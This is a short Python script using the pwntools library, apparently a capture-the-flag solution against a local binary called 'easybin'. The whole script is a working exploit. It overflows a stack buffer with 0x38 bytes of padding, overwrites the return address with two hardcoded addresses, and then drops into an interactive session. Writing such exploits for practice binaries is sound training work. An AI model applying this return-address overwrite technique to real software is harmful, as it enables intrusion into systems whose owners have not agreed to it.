from pwn import *

p = process("./easybin")
payload = ""
payload += "A"*0x38
payload += p64(0x0000000000401169)
payload += p64(0x0000000000401146)

p.send(payload)
p.interactive()
